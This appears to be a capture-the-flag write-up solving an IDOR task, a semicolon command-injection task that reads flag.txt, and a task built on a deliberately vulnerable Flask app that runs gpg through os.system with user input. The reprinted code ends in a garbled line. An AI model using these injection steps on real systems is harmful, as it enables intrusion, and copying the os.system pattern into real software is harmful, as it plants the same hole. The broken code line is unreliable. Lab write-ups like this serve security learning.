### Task 9:
+ Use the credentials to log into the web application. Change user id in browser . Insecure Direct Object Reference (IDOR). Confirm Flag.

### Task 10:
+ Open website; inspect page; tried intercepting with BurpSuite; only POST and Response shows up, OK, it looks like this is a shell; used command injection:
```
; whoami
ubuntu
; ls -la
<response>
; cat flag.txt
Confirm flag
```

<img width="1668" height="582" alt="image-2" src="https://github.com/user-attachments/assets/7eea878e-b499-44bf-a296-f4948029bf13" />

<img width="1668" height="582" alt="image-4" src="https://github.com/user-attachments/assets/4c329a33-2d68-416e-9310-c42b68353b14" />


***Note: ; (semicolon) allows multiple commands sequentially. So used it to escape the first command that ran the .py script, then executed my queries.***

### Task 11:
+ In Task 10, when list file I've found the file name `app.py.save`.
+ Check it and this is code of Task 11:
```
Usage: python3 enc.py -r <recipient> -t <text>
from flask import Flask, request, render_template, send_file, abort
import os
import tempfile

app = Flask(__name__)
UPLOAD_FOLDER = tempfile.gettempdir()

@app.route("/", methods=["GET", "POST"])
def encrypt_file():
    if request.method == "POST":
        uploaded_file = request.files.get("file")
        recipient = request.form.get("recipient", "")
        
        if not uploaded_file:
            error = "No file uploaded."
            return render_template("encrypt.html", error=error)
        
        # Save the uploaded file
        filepath = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)
        uploaded_file.save(filepath)
        
        # Allowed PGP keys
        allowed_recipients = [
            "ByteReaper", "NullPhantom", "Cipher",
            "ShadowPacket", "GhostTrace", "DarkInjector"
        ]
        
        # Check that the provided recipient is allowed.
        # (This check is too simplistic and can be bypassed if an attacker modifies the request)
        if recipient not in allowed_recipients:
            error = "Invalid encryption recipient selected."
            return render_template("encrypt.html", error=error)
        
        # Vulnerable command construction:
        # The command is built directly with user input, enabling injection if the value is manipulated.
        command = f"gpg --encrypt --recipient {recipient} --output {filepath}.gpg {filepath}"
        os.system(command)
        
        # Return the encrypted file for download
        return send_file(f"{filepath}.gpg", as_attachment=True)
    
    return render_template("encrypt.html")

if __name__ == "__main__":
    app.run(hots0st dssdsdsdebug=True)
```

+ The vuln appear in `command` and `os.system`.
+ Thinking `Command Injection` and potential param are `filepath` or `recipient` .
+ Found the syntax to exploit `Command Injection` and `RCE` that is  `$()`.
<img width="3122" height="1282" alt="image-5" src="https://github.com/user-attachments/assets/8f52056e-3bf0-4010-bc1d-9efbd17f2ee7" />

***Note: `$(command)` is “command substitution”.  As you seem to understand, it runs the command, captures its output, and inserts that into the command line that contains the $()***
